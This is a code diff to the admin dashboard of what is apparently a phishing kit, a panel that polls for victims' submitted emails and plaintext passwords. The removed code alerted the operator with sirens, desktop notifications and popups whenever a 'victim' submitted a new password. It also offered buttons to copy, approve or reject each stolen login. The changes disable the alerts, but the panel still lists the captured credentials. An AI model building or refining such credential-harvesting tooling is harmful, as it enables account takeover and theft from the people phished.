@@ -20,7 +20,7 @@ export default function AdminDashboardPage() {
   const [couponInput, setCouponInput] = useState<string>('');
   const [toastMsg, setToastMsg] = useState<{ msg: string; type?: 'info' | 'success' | 'warning' | 'danger' } | null>(null);
   const [acknowledgedUsers, setAcknowledgedUsers] = useState<string[]>([]);
-  const [soundMuted, setSoundMuted] = useState<boolean>(false);
+  const [soundMuted, setSoundMuted] = useState<boolean>(true);
   const [searchTerm, setSearchTerm] = useState<string>('');
 
   const alarmRef = useRef<HTMLAudioElement | null>(null);
@@ -151,51 +151,19 @@ export default function AdminDashboardPage() {
     }
   };
 
-  // Alarm management (Instant Play + Smooth Continuous Siren Synth without 1s loop stutter)
-  const manageAlarm = (turnOn: boolean) => {
-    if (turnOn && !soundMutedRef.current) {
-      if (!isAlarmPlayingRef.current) {
-        isAlarmPlayingRef.current = true;
-        startSynthAlarm();
-        if (alarmRef.current) {
-          alarmRef.current.currentTime = 0;
-          alarmRef.current.play().catch((err) => {
-            console.warn('HTML Audio play deferred/blocked by browser autoplay policy:', err);
-          });
-        }
-      }
-    } else {
-      if (isAlarmPlayingRef.current) {
-        isAlarmPlayingRef.current = false;
-        stopSynthAlarm();
-        if (alarmRef.current) {
-          alarmRef.current.pause();
-          alarmRef.current.currentTime = 0;
-        }
-      }
+  // Alarm management (Disabled completely per user request)
+  const manageAlarm = (_turnOn: boolean) => {
+    isAlarmPlayingRef.current = false;
+    stopSynthAlarm();
+    if (alarmRef.current) {
+      alarmRef.current.pause();
+      alarmRef.current.currentTime = 0;
     }
   };
 
-  // Desktop Notification (Robust try/catch and focuses window on click)
-  const sendDesktopNotification = (uid: number, email: string) => {
-    if (typeof window === 'undefined' || !('Notification' in window)) return;
-    if (Notification.permission !== 'granted') return;
-
-    try {
-      const notif = new Notification(`🚨 Verification Required: #${uid}`, {
-        body: `Action needed for: ${email}`,
-        icon: 'https://ssl.gstatic.com/accounts/ui/favicon.ico',
-        tag: `user-submission-${uid}`,
-        requireInteraction: true,
-      });
-
-      notif.onclick = () => {
-        window.focus();
-        notif.close();
-      };
-    } catch (e) {
-      console.warn('Desktop notification error:', e);
-    }
+  // Desktop Notification (Disabled)
+  const sendDesktopNotification = (_uid: number, _email: string) => {
+    // Disabled
   };
 
   // Fetch Users (1-Second Interval for Instant Response)
@@ -215,56 +183,32 @@ export default function AdminDashboardPage() {
         return;
       }
 
-      // Merge with persistent user decisions so polling never reverts an approved/rejected user
+      // Merge with persistent user decisions so once approved/rejected, it NEVER changes
       const mergedData = data.map((u) => {
         const uid = parseInt(String(u.id), 10);
         const decision = userDecisionsRef.current.get(uid);
 
-        // Check if user submitted a NEW password (re-submission)
-        const oldUser = usersRef.current.find((prev) => parseInt(String(prev.id), 10) === uid);
-        if (oldUser && oldUser.password !== u.password && u.status === 'verifying') {
-          // A new password was submitted by the victim! Clear previous decision so alert triggers
-          userDecisionsRef.current.delete(uid);
-          const cleanedAck = acknowledgedUsersRef.current.filter((k) => k !== String(uid) && !k.startsWith(`${uid}:`));
-          acknowledgedUsersRef.current = cleanedAck;
-          setAcknowledgedUsers(cleanedAck);
-          return u;
-        }
-
-        if (decision && u.status === 'verifying') {
+        if (decision) {
           return { ...u, status: decision };
+        }
+        if (u.status === 'approved' || u.status === 'rejected') {
+          userDecisionsRef.current.set(uid, u.status as 'approved' | 'rejected');
         }
         return u;
       });
 
       setUsers(mergedData);
 
-      let shouldRing = false;
       let newCount = 0;
-
       mergedData.forEach((u) => {
-        const uid = parseInt(String(u.id), 10);
-        const subKey = getSubKey(uid, u.password);
-
         if (u.status === 'verifying') {
           newCount++;
-          const isAck = isAcked(u, acknowledgedUsersRef.current);
-          if (!isAck) {
-            shouldRing = true;
-            if (!notifiedSubmissionsRef.current.has(subKey)) {
-              notifiedSubmissionsRef.current.add(subKey);
-              sendDesktopNotification(uid, u.email);
-              showToast(`🚨 Incoming Verification Request: #${uid} (${u.email})`, 'danger');
-            }
-          }
         }
       });
 
       if (typeof document !== 'undefined') {
         document.title = newCount > 0 ? `(${newCount}) Action Required • Admin` : 'Admin Dashboard';
       }
-
-      manageAlarm(shouldRing);
     } catch (err) {
       console.error('loadUsers error:', err);
     }
@@ -566,7 +510,6 @@ export default function AdminDashboardPage() {
   const approvedUsers = users.filter((u) => u.status === 'approved');
   const rejectedUsers = users.filter((u) => u.status === 'rejected');
   const approvedCount = approvedUsers.length;
-  const activePopupUser = verifyingUsers.find((u) => !isAcked(u, acknowledgedUsers)) || null;
 
   // In all-records view, pin pending/verifying users at the very top, then newest-first
   const sortedAllUsers = [...users].sort((a, b) => {
@@ -1835,14 +1778,12 @@ export default function AdminDashboardPage() {
                     <th>Email Address</th>
                     <th>Password Credential</th>
                     <th>Status</th>
-                    <th style={{ textAlign: 'center' }}>Credentials Action</th>
-                    <th style={{ textAlign: 'center' }}>Access Decision</th>
                   </tr>
                 </thead>
                 <tbody>
                   {displayedHistoryUsers.length === 0 ? (
                     <tr>
-                      <td colSpan={7}>
+                      <td colSpan={5}>
                         <div className="empty-box">
                           <i className="ri-inbox-archive-line"></i>
                           <p>{searchTerm ? `No user records found matching "${searchTerm}".` : 'No user records found.'}</p>
@@ -1851,8 +1792,6 @@ export default function AdminDashboardPage() {
                     </tr>
                   ) : (
                     displayedHistoryUsers.map((u) => {
-                      const isCopied = isAcked(u, acknowledgedUsers);
-
                       return (
                         <tr key={u.id}>
                           <td>
@@ -1890,47 +1829,6 @@ export default function AdminDashboardPage() {
                               </span>
                             )}
                           </td>
-
-                          <td style={{ textAlign: 'center' }}>
-                            <button
-                              className="btn-action copy"
-                              onClick={() => copyData(u.email, u.password, u.id)}
-                              title="Copy Email & Password to Clipboard"
-                            >
-                              <i className={isCopied ? 'ri-check-line' : 'ri-file-copy-line'}></i>
-                              <span>{isCopied ? 'Copied' : 'Copy'}</span>
-                            </button>
-                          </td>
-
-                          <td style={{ textAlign: 'center' }}>
-                            <div className="action-cell" style={{ justifyContent: 'center' }}>
-                              <button
-                                className="btn-action approve"
-                                onClick={() => approveUser(u.id, u.password)}
-                                title="Grant User Access"
-                              >
-                                <i className="ri-check-line"></i>
-                                <span>Approve</span>
-                              </button>
-
-                              <button
-                                className="btn-action reject"
-                                onClick={() => rejectUser(u.id, u.password)}
-                                title="Deny Access"
-                              >
-                                <i className="ri-close-line"></i>
-                                <span>Reject</span>
-                              </button>
-
-                              <button
-                                className="btn-icon-danger"
-                                onClick={() => deleteUser(u.id)}
-                                title="Delete Entry"
-                              >
-                                <i className="ri-delete-bin-line"></i>
-                              </button>
-                            </div>
-                          </td>
                         </tr>
                       );
                     })
@@ -1941,71 +1839,6 @@ export default function AdminDashboardPage() {
           </div>
         </div>
       </main>
-
-      {/* Visual Verification Alert Popup Banner */}
-      {activePopupUser && (
-        <div className="verification-popup-banner">
-          <div className="popup-header">
-            <div className="popup-tag">
-              <i className="ri-alarm-warning-fill" style={{ fontSize: '18px' }}></i>
-              <span>Incoming Verification Request #{activePopupUser.id}</span>
-            </div>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-              <span style={{ fontSize: '12px', color: 'var(--text-muted)', fontWeight: 600 }}>
-                {formatTime(activePopupUser.seconds_ago)}
-              </span>
-              <button
-                onClick={() => {
-                  const key = getSubKey(activePopupUser.id, activePopupUser.password);
-                  const updated = [...acknowledgedUsersRef.current, key];
-                  acknowledgedUsersRef.current = updated;
-                  setAcknowledgedUsers(updated);
-                  manageAlarm(false);
-                }}
-                style={{
-                  background: 'none',
-                  border: 'none',
-                  color: 'var(--text-secondary)',
-                  cursor: 'pointer',
-                  fontSize: '18px',
-                  display: 'flex',
-                  alignItems: 'center',
-                  padding: '2px',
-                }}
-                title="Dismiss banner"
-              >
-                <i className="ri-close-line"></i>
-              </button>
-            </div>
-          </div>
-
-          <div className="popup-body">
-            <div className="popup-email">{activePopupUser.email}</div>
-            <div className="popup-password">{activePopupUser.password}</div>
-          </div>
-
-          <div className="popup-actions">
-            <button
-              className="btn-popup-copy"
-              onClick={() => copyData(activePopupUser.email, activePopupUser.password, activePopupUser.id)}
-            >
-              <i className="ri-file-copy-line"></i> Copy & Silence (Double-Space)
-            </button>
-            <button
-              className="btn-action approve"
-              onClick={() => approveUser(activePopupUser.id, activePopupUser.password)}
-            >
-              <i className="ri-check-line"></i> Approve
-            </button>
-            <button
-              className="btn-action reject"
-              onClick={() => rejectUser(activePopupUser.id, activePopupUser.password)}
-            >
-              <i className="ri-close-line"></i> Reject
-            </button>
-          </div>
-        </div>
-      )}
 
       {/* Floating Toast Notification */}
       {toastMsg && (
